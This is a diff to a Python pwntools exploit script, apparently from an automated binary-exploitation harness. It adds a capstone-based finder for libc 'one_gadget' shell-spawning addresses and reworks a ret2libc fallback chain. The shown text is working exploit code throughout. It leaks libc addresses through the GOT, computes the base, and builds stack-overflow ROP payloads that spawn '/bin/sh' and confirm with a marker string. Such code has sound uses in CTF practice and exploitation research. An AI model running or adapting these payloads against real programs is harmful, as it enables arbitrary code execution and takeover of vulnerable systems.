@@ -31,6 +31,42 @@ libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
 puts_off = libc.symbols["puts"]; system_off = libc.symbols["system"]
 binsh_off = next(libc.search(b"/bin/sh\x00"))
 MARK = b"BINORACLE_LIBC_PWNED"
+
+def _one_gadgets(lc):
+    # Candidate one_gadget offsets (libc-relative): a single libc address that spawns a shell.
+    # Prefer the external `one_gadget` tool, but fall back to a PURE-PYTHON finder (capstone) so
+    # this works with NO external dependency: scan .text for `lea rdi, [rip -> "/bin/sh"]` -- the
+    # entry points that set rdi to "/bin/sh" just before an execve, i.e. real one_gadgets. Execution
+    # then filters which actually fire (their register constraints are satisfied at runtime).
+    try:
+        import subprocess as _sp
+        raw = _sp.run(["one_gadget", "--raw", lc.path], capture_output=True, text=True, timeout=30).stdout
+        got = [int(x, 0) for x in raw.split()]
+        if got:
+            return got
+    except Exception:
+        pass
+    out = []
+    try:
+        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
+        binsh_va = next(lc.search(b"/bin/sh\x00"))
+        sec = lc.get_section_by_name(".text"); data = sec.data(); va = sec.header.sh_addr
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        for ins in md.disasm(data, va):
+            if ins.mnemonic == "lea" and "rdi" in ins.op_str and "rip" in ins.op_str and "0x" in ins.op_str:
+                try:
+                    disp = int(ins.op_str.split("[rip")[1].split("]")[0].replace(" ", "").replace("+", "", 1), 16)
+                except Exception:
+                    continue
+                if ins.address + ins.size + disp == binsh_va:
+                    out.append(ins.address)
+                    if len(out) >= 8:
+                        break
+    except Exception:
+        pass
+    return out
+
+OGS = _one_gadgets(libc)     # computed ONCE (not per-offset): constant for this libc
 for OFF in OFF_CANDS:
     for a1 in (1, 0):
         s1 = b"A" * OFF + p64(ret) * a1 + p64(pr) + p64(puts_got) + p64(puts_plt) + p64(reenter)
@@ -54,14 +90,9 @@ for OFF in OFF_CANDS:
             if MARK in run(inp):
                 print("VERIFIED off=%d leak=%#x base=%#x system=%#x" % (OFF, leak, base, system))
                 sys.exit(0)
-        # fallback: one_gadget (single magic libc address that spawns a shell)
-        try:
-            import subprocess as _sp
-            ogs = [int(x, 0) for x in _sp.run(["one_gadget", "--raw", libc.path],
-                   capture_output=True, text=True, timeout=30).stdout.split()]
-        except Exception:
-            ogs = []
-        for og in ogs:
+        # fallback: one_gadget (single magic libc address that spawns a shell). Offsets computed
+        # once above (external tool or the pure-python capstone finder).
+        for og in OGS:
             for a2 in (0, 1):
                 chain = b"A" * OFF + p64(ret) * a2 + p64(base + og)
                 inp = chain.ljust(READSZ, b"A") + b"\n echo " + MARK + b"\n"
